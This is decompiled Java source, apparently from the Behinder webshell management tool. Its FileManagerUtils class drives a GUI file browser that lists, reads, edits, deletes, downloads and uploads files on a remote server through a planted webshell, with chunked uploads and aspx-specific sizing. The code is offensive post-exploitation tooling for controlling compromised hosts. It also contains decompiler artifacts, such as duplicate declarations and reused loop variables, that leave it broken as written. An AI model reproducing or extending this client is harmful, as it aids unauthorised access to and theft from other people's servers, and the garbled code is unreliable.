 package net.rebeyond.behinder.ui;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.util.List;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.utils.Utils;
 import org.eclipse.swt.custom.StackLayout;
 import org.eclipse.swt.events.MouseEvent;
 import org.eclipse.swt.graphics.Image;
 import org.eclipse.swt.widgets.Combo;
 import org.eclipse.swt.widgets.Composite;
 import org.eclipse.swt.widgets.Display;
 import org.eclipse.swt.widgets.Event;
 import org.eclipse.swt.widgets.FileDialog;
 import org.eclipse.swt.widgets.Label;
 import org.eclipse.swt.widgets.Listener;
 import org.eclipse.swt.widgets.Menu;
 import org.eclipse.swt.widgets.MenuItem;
 import org.eclipse.swt.widgets.Table;
 import org.eclipse.swt.widgets.TableColumn;
 import org.eclipse.swt.widgets.TableItem;
 import org.eclipse.swt.widgets.Text;
 import org.eclipse.swt.widgets.Tree;
 import org.eclipse.swt.widgets.TreeItem;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 
 
 
 
 
 
 
 
 
 
 public class FileManagerUtils
 {
   private ShellService currentShellService;
   private Label statusLabel;
   private Combo currentPathCombo;
   private String osInfo;
   public static int BUFFSIZE = 46080;
   
   public FileManagerUtils(ShellService shellService, Label statusLabel, Combo currentPathCombo, String osInfo) {
     this.currentShellService = shellService;
     this.statusLabel = statusLabel;
     this.currentPathCombo = currentPathCombo;
     this.osInfo = osInfo;
   }
   
   public void expandPathByPathString(String path, Tree tree, Table table) {
     try {
       File f = new File(path);
       String realPath = f.getPath();
       String[] pathComps;
       if (this.osInfo.indexOf("windows") >= 0)
       {
         realPath = realPath.replace("/", "\\");
         realPath = realPath.replaceAll("\\.+\\\\", "");
         String[] pathComps = realPath.split("\\\\");
         if (pathComps.length > 0) {
           pathComps[0] = (pathComps[0] + "/");
         } else {
           pathComps = new String[] { "C:/" };
         }
       }
       else
       {
         realPath = realPath.replace("\\", "/");
         realPath = realPath.replaceAll("\\.+/", "");
         pathComps = realPath.split("/");
         if (pathComps.length > 0) {
           pathComps[0] = "/";
         } else
           pathComps = new String[] { "/" };
       }
       TreeItem currentNode = tree.getItem(0);
       for (int i = 0; i < pathComps.length; i++)
       {
         String comp = pathComps[i];
         boolean existed = false;
         TreeItem[] treeItems;
         TreeItem[] treeItems; if (i == 0)
         {
           treeItems = currentNode.getParent().getItems();
         }
         else
         {
           treeItems = currentNode.getItems(); }
         TreeItem[] arrayOfTreeItem1;
         int j = (arrayOfTreeItem1 = treeItems).length; for (int i = 0; i < j; i++) { TreeItem item = arrayOfTreeItem1[i];
           
           if (item.getText().equals(comp))
           {
             currentNode = item;
             existed = true;
             break;
           }
         }
         
 
         if (!existed)
         {
           TreeItem t = new TreeItem(currentNode, 0);
           t.setImage(new Image(table.getDisplay(), new ByteArrayInputStream(
             Utils.getResourceData("net/rebeyond/behinder/resource/folder.png"))));
           
           t.setText(comp);
           currentNode = t;
         }
       }
       
       this.currentPathCombo.setText(realPath);
       expandPathByNode(currentNode, table);
     }
     catch (Exception e)
     {
       e.printStackTrace();
     }
   }
   
   public void expandPathByNode(final TreeItem currentNode, final Table table) {
     this.statusLabel.setText("正在读取目录……");
     currentNode.getParent().setSelection(currentNode);
     currentNode.removeAll();
     table.removeAll();
     final String currentPath = getFullPath(currentNode);
     this.currentPathCombo.setText(currentPath);
     new Thread()
     {
 
       public void run()
       {
 
         try
         {
           final JSONObject resultObj = FileManagerUtils.this.currentShellService.listFiles(currentPath);
           Display.getDefault().syncExec(new Runnable()
           {
             public void run() {
               try {
                 String status = resultObj.getString("status");
                 String msg = resultObj.getString("msg");
                 if (status.equals("fail")) {
                   FileManagerUtils.this.statusLabel.setText("目录读取失败:" + msg);
                   return;
                 }
                 FileManagerUtils.this.statusLabel.setText("目录读取成功");
                 msg = msg.replace("},]", "}]");
                 
                 JSONArray objArr = new JSONArray(msg.trim());
                 for (int i = 0; i < objArr.length(); i++) {
                   JSONObject obj = objArr.getJSONObject(i);
                   String type = new String(Base64.decode(obj.getString("type")), "UTF-8");
                   String name = new String(Base64.decode(obj.getString("name")), "UTF-8");
                   String size = new String(Base64.decode(obj.getString("size")), "UTF-8");
                   String lastModified = new String(Base64.decode(obj.getString("lastModified")), "UTF-8");
                   TableItem item = new TableItem(this.val$table, 0);
                   item.setText(new String[] { name, size, lastModified });
                   
                   if (type.equals("directory")) {
                     item.setImage(0, new Image(this.val$table.getDisplay(), new ByteArrayInputStream(
                       Utils.getResourceData("net/rebeyond/behinder/resource/folder.png"))));
                   }
                   else {
                     item.setImage(0, new Image(this.val$table.getDisplay(), new ByteArrayInputStream(
                       Utils.getResourceData("net/rebeyond/behinder/resource/file.png"))));
                   }
                   
                   if ((type.trim().equals("directory")) && 
                     (!name.equals(".")) && (!name.equals("..")))
                   {
                     TreeItem t = new TreeItem(this.val$currentNode, 0);
                     t.setImage(new Image(this.val$table.getDisplay(), new ByteArrayInputStream(
                       Utils.getResourceData("net/rebeyond/behinder/resource/folder.png"))));
                     
                     t.setText(name);
                   }
                 }
                 this.val$currentNode.setExpanded(true);
                 for (int i = 0; i < this.val$table.getColumnCount(); i++) {
                   this.val$table.getColumn(i).pack();
                 }
               }
               catch (Exception e)
               {
                 if (FileManagerUtils.this.statusLabel.isDisposed())
                   return;
                 FileManagerUtils.this.statusLabel.setText(e.getMessage());
               }
             }
           });
         }
         catch (Exception e)
         {
           e.printStackTrace();
         }
       }
     }.start();
   }
   
   public void downloadFile(TreeItem currentNode, Table table)
     throws Exception
   {
     TableItem select = table.getSelection()[0];
     String fileName = select.getText(0);
     final String fileFullPath = getFullPath(currentNode) + fileName;
     FileDialog filedlg = new FileDialog(table.getShell(), 4096);
     
     filedlg.setText("文件选择");
     
     filedlg.setFilterPath("SystemRoot");
     filedlg.setFileName(fileName);
     
     final String selected = filedlg.open();
     if ((selected == null) || (selected.equals("")))
       return;
     this.statusLabel.setText("正在下载" + fileFullPath + "……");
     new Thread() {
       public void run() {
         try {
           FileManagerUtils.this.currentShellService.downloadFile(fileFullPath, selected);
           File f = new File(selected);
           final String result = f.getName() + "下载完成,文件大小:" + f.length();
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (FileManagerUtils.this.statusLabel.isDisposed())
                 return;
               FileManagerUtils.this.statusLabel.setText(result);
             }
           });
         }
         catch (Exception e)
         {
           e.printStackTrace();
         }
       }
     }.start();
   }
   
   public void deleteFile(TreeItem currentNode, Table table) throws Exception {
     TableItem select = table.getSelection()[0];
     String fileFullPath = getFullPath(currentNode) + select.getText(0);
     JSONObject resultObj = this.currentShellService.deleteFile(fileFullPath);
     String status = resultObj.getString("status");
     String msg = resultObj.getString("msg");
     if (status.equals("success")) {
       expandPathByNode(currentNode, table);
     }
     this.statusLabel.setText(msg);
   }
   
   public void openFile(TreeItem currentNode, final Table table, Text filePathTxt, final Text fileContentTxt, Combo charsetCombo)
     throws Exception
   {
     TableItem select = table.getSelection()[0];
     final String fileFullPath = getFullPath(currentNode) + select.getText(0);
     filePathTxt.setText(fileFullPath);
     final String charset = charsetCombo.getSelectionIndex() > -1 ? charsetCombo.getText() : null;
     new Thread()
     {
       public void run()
       {
         try {
           JSONObject resultObj = FileManagerUtils.this.currentShellService.showFile(fileFullPath, charset);
           final String status = resultObj.getString("status");
           final String msg = resultObj.getString("msg");
           
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (FileManagerUtils.this.statusLabel.isDisposed())
                 return;
               if (status.equals("fail")) {
                 FileManagerUtils.this.statusLabel.setText("文件打开失败:" + msg);
                 return;
               }
               this.val$fileContentTxt.setText(msg);
               StackLayout layout = (StackLayout)this.val$table.getParent().getParent().getLayout();
               layout.topControl = this.val$fileContentTxt.getParent();
               this.val$table.getParent().getParent().layout();
               this.val$fileContentTxt.setFocus();
             }
           });
         }
         catch (Exception e) {
           e.printStackTrace();
         }
       }
     }.start();
   }
   
   public void showFile(Text filePathTxt, Text fileContentTxt, Combo charsetCombo)
     throws Exception
   {
     String fileFullPath = filePathTxt.getText();
     String charset = null;
     if (charsetCombo.getSelectionIndex() > -1) {
       charset = charsetCombo.getText();
     }
     
     JSONObject resultObj = this.currentShellService.showFile(fileFullPath, charset);
     String status = resultObj.getString("status");
     String msg = resultObj.getString("msg");
     if (status.equals("fail")) {
       this.statusLabel.setText("文件打开失败:" + msg);
       return;
     }
     fileContentTxt.setText(msg);
   }
   
   public void saveFile(Text filePathTxt, Text fileContentTxt, Combo charsetCombo) throws Exception {
     final String fileFullPath = filePathTxt.getText();
     String charset = null;
     if (charsetCombo.getSelectionIndex() > -1) {
       charset = charsetCombo.getText();
     }
     final byte[] fileContent = charset == null ? fileContentTxt.getText().getBytes() : 
       fileContentTxt.getText().getBytes(charset);
     
     this.statusLabel.setText("正在保存……");
     new Thread() {
       public void run() {
         try {
           JSONObject resultObj = FileManagerUtils.this.currentShellService.uploadFile(fileFullPath, fileContent, true);
           final String status = resultObj.getString("status");
           final String msg = resultObj.getString("msg");
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (FileManagerUtils.this.statusLabel.isDisposed())
                 return;
               if (status.equals("success")) {
                 FileManagerUtils.this.statusLabel.setText("保存成功。");
               } else {
                 FileManagerUtils.this.statusLabel.setText("保存失败:" + msg);
               }
             }
           });
         } catch (Exception e) {
           if (e.getMessage() != null)
           {
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (FileManagerUtils.this.statusLabel.isDisposed())
                   return;
                 FileManagerUtils.this.statusLabel.setText(e.getMessage());
               }
             });
           }
         }
       }
     }.start();
   }
   
 
   public void showContextMenu(MouseEvent e, final Tree tree, final Table table, final Text filePathTxt, final Text fileContentTxt, final Combo charsetCombo)
   {
     if (e.button == 3) {
       Menu menu = new Menu(table);
       table.setMenu(menu);
       MenuItem refreshItem = new MenuItem(menu, 8);
       refreshItem.setText("刷新");
       refreshItem.addListener(13, new Listener()
       {
 
         public void handleEvent(Event arg0)
         {
           TreeItem currentNode = tree.getSelection()[0];
           try
           {
             FileManagerUtils.this.expandPathByNode(currentNode, table);
           }
           catch (Exception e) {
             e.printStackTrace();
           }
         }
       });
       MenuItem openItem = new MenuItem(menu, 8);
       openItem.setText("打开");
       openItem.addListener(13, new Listener()
       {
 
         public void handleEvent(Event arg0)
         {
           TreeItem currentNode = tree.getSelection()[0];
           if (table.getSelection().length == 0)
             return;
           try {
             FileManagerUtils.this.openFile(currentNode, table, filePathTxt, fileContentTxt, charsetCombo);
           }
           catch (Exception e) {
             e.printStackTrace();
           }
         }
       });
       MenuItem deleteItem = new MenuItem(menu, 8);
       deleteItem.setText("删除");
       deleteItem.addListener(13, new Listener()
       {
 
         public void handleEvent(Event arg0)
         {
           if (table.getSelection().length == 0)
             return;
           TreeItem currentNode = tree.getSelection()[0];
           try {
             FileManagerUtils.this.deleteFile(currentNode, table);
           }
           catch (Exception e)
           {
             e.printStackTrace();
           }
         }
       });
       MenuItem downloadItem = new MenuItem(menu, 8);
       downloadItem.setText("下载");
       downloadItem.addListener(13, new Listener()
       {
 
         public void handleEvent(Event arg0)
         {
           if (table.getSelection().length == 0)
             return;
           TreeItem currentNode = tree.getSelection()[0];
           try {
             FileManagerUtils.this.downloadFile(currentNode, table);
           }
           catch (Exception e) {
             e.printStackTrace();
           }
         }
       });
       MenuItem uploadItem = new MenuItem(menu, 8);
       uploadItem.setText("上传");
       uploadItem.addListener(13, new Listener()
       {
 
         public void handleEvent(Event arg0)
         {
           TreeItem currentNode = tree.getSelection()[0];
           try {
             FileManagerUtils.this.uploadFile(currentNode, table);
           }
           catch (Exception e) {
             e.printStackTrace();
           }
         }
       });
     }
   }
   
 
 
 
 
 
 
 
 
 
 
 
   public void uploadFile(final TreeItem currentNode, final Table table)
     throws Exception
   {
     final String fileFullPath = getFullPath(currentNode);
     
 
     FileDialog filedlg = new FileDialog(currentNode.getParent().getShell(), 4096);
     
     filedlg.setText("文件选择");
     
     filedlg.setFilterPath(".");
     
     String localPath = filedlg.open();
     final String fileName = new File(localPath).getName();
     final byte[] fileContent = Utils.getFileData(localPath);
     this.statusLabel.setText("正在上传……");
     if (this.currentShellService.currentType.equals("aspx")) {
       BUFFSIZE = 524288;
     }
     
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
     new Thread()
     {
       public void run()
       {
         try
         {
           if (fileContent.length < FileManagerUtils.BUFFSIZE) {
             JSONObject resultObj = FileManagerUtils.this.currentShellService.uploadFile(fileFullPath + fileName, fileContent);
             String status = resultObj.getString("status");
             final String msg = resultObj.getString("msg");
             if (status.equals("fail")) {
               Display.getDefault().syncExec(new Runnable() {
                 public void run() {
                   if (FileManagerUtils.this.statusLabel.isDisposed())
                     return;
                   FileManagerUtils.this.statusLabel.setText("文件上传失败:" + msg);
                 }
               });
             }
           }
           else {
             List<byte[]> blocks = Utils.splitBytes(fileContent, FileManagerUtils.BUFFSIZE);
             for (int i = 0; i < blocks.size(); i++) {
               if (i == 0)
               {
                 JSONObject resultObj = FileManagerUtils.this.currentShellService.uploadFile(fileFullPath + fileName, 
                   (byte[])blocks.get(i));
                 
                 String status = resultObj.getString("status");
                 final String msg = resultObj.getString("msg");
                 if (status.equals("fail")) {
                   Display.getDefault().syncExec(new Runnable() {
                     public void run() {
                       if (FileManagerUtils.this.statusLabel.isDisposed())
                         return;
                       FileManagerUtils.this.statusLabel.setText("文件上传失败:" + msg);
                     }
                     
 
                   });
                 }
               }
               else
               {
                 JSONObject resultObj = FileManagerUtils.this.currentShellService.appendFile(fileFullPath + fileName, 
                   (byte[])blocks.get(i));
                 final String status = resultObj.getString("status");
                 final String msg = resultObj.getString("msg");
                 final int currentBlockIndex = i;
                 Display.getDefault().syncExec(new Runnable() {
                   public void run() {
                     if (FileManagerUtils.this.statusLabel.isDisposed())
                       return;
                     if (status.equals("fail"))
                     {
                       FileManagerUtils.this.statusLabel.setText("文件上传失败:" + msg);
                       return;
                     }
                     FileManagerUtils.this.statusLabel.setText(String.format("正在上传……%skb/%skb", new Object[] {
                       Integer.valueOf(FileManagerUtils.BUFFSIZE * currentBlockIndex / 1024), Integer.valueOf(this.val$fileContent.length / 1024) }));
                   }
                 });
                 if (status.equals("fail")) {
                   return;
                 }
               }
             }
           }
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (FileManagerUtils.this.statusLabel.isDisposed())
                 return;
               FileManagerUtils.this.statusLabel.setText("上传完成");
               FileManagerUtils.this.expandPathByNode(this.val$currentNode, this.val$table);
             }
           });
         }
         catch (Exception e)
         {
           if (e.getMessage() != null)
           {
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (FileManagerUtils.this.statusLabel.isDisposed())
                   return;
                 FileManagerUtils.this.statusLabel.setText(e.getMessage());
               }
             });
           }
         }
       }
     }.start();
   }
   
   private String getFullPath(TreeItem currentNode) {
     String fileSep = "/";
     
 
 
 
     String currentPath = currentNode.getText();
     TreeItem parent = currentNode;
     while ((parent = parent.getParentItem()) != null) {
       String parentText = parent.getText();
       if (parent.getData("type") != null)
       {
         currentPath = parent.getText() + currentPath;
       } else {
         currentPath = parent.getText() + fileSep + currentPath;
       }
     }
     
     if ((currentNode.getData("type") == null) && (!currentPath.endsWith(fileSep)))
       currentPath = currentPath + fileSep;
     return currentPath;
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/ui/FileManagerUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */